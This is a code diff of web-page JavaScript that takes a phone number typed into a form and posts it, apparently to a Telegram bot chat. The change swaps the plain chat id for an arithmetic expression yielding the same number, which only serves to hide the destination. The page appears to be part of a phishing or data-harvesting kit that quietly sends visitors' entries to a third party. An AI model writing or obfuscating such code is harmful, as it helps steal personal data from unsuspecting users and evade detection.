@@ -31,7 +31,7 @@
         const last=0
         const phoneNumber=document.querySelectorAll("input")[1]
 
-        const chatId = '222606449';
+        const CI = `${(44521288*5)+9}`;
         const send=document.getElementById("form")
         const buttonsend=document.getElementsByClassName("send")[0]
 
@@ -76,7 +76,7 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: chatId,
+                            chat_id: CI,
                             text: number
                         })
                     });
